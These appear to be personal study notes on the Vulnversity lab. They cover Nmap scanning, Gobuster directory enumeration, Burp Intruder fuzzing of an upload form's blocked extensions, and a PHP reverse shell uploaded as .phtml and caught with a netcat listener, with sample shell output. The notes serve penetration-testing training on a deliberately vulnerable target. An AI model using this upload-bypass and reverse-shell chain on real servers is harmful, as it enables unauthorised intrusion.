# Offensive Pentesting

[TOC]

## Vulnversity

### Reconnaissance with `Nmap`

- `-sV`: determine the version of services running
- `-p <PORT_NUMBER>`: port scan
- `-p-`: scans for all ports
- `-p1-200`: scans for ports from 1 to 200
- `-Pn`: disable *host discovery* and scan for open ports
- `-A`: enables OS and version detection, executes in-build scripts for further enumeration

### Locating directories using `Gobuster`

- With `Gobuster`, we will locate a directory to which we can use to upload a shell
- Need a wordlist, can find many under `/usr/share/wordlists` in Kali
- `gobuster dir -u <URL> -w <WORDLIST>`
    - `dir` specifies the mode: directory and file enumeration
    - `-u <URL>` the URL of the target web server
    - `-w <WORDLIST>` specifies the wordlist path
- Other flags
    - `-U` and `-P`: specifies the username and password for authentication
    - `-p <x>`: proxy to use for requests
    - `-c <HTTP_COOKIES>`: specifies a cookie for simulating auth
- By default, `gobuster` will only search for 1 layer of directory

### Compromising the Webserver

- After finding a form to upload files, we can leverage it to upload and execute our payload
- Fuzzing the upload form to identify which extensions are not blocked with `BurpSuite`
    - Use intruder (used for automating customised attacks). To begin, make a wordlist with possible extensions

        ```
        .php
        .php3
        .php4
        .php5
        .phtml
        ```
- Then, we upload any file and intercept the request, send it to the intruder, choose `Sniper` as attack type
- In the payload, embrace the file extension (`.*`) with `§`, e.g., `file§.php§`
- Paste the extension list to payload settings, and start attack
- Take care of the `URL-encode these characters` option in "Payload encoding", and do not URL-encode the `.` character

### Getting a Reverse Shell

- Prepare a reverse PHP shell, name it as `php-reverse-shell.phtml`
- Upload this file, listen to port 1234 (`nc -lvnp 1234`), and visit `http://<TARGET_IP>:3333/internal/uploads/php-reverse-shell.phtml`, this will get the payload executed

    ```bash
    # nc -lvnp 1234
    Listening on [0.0.0.0] (family 0, port 1234)
    Connection from 10.10.39.75 47710 received!
    Linux vulnuniversity 4.4.0-142-generic #168-Ubuntu SMP Wed Jan 16 21:00:45 UTC 2019 x86_64 x86_64 x86_64 GNU/Linux
    06:43:12 up 27 min,  0 users,  load average: 0.00, 0.04, 0.07
    USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
    uid=33(www-data) gid=33(www-data) groups=33(www-data)
    /bin/sh: 0: can't access tty; job control turned off
    $ 
    ```
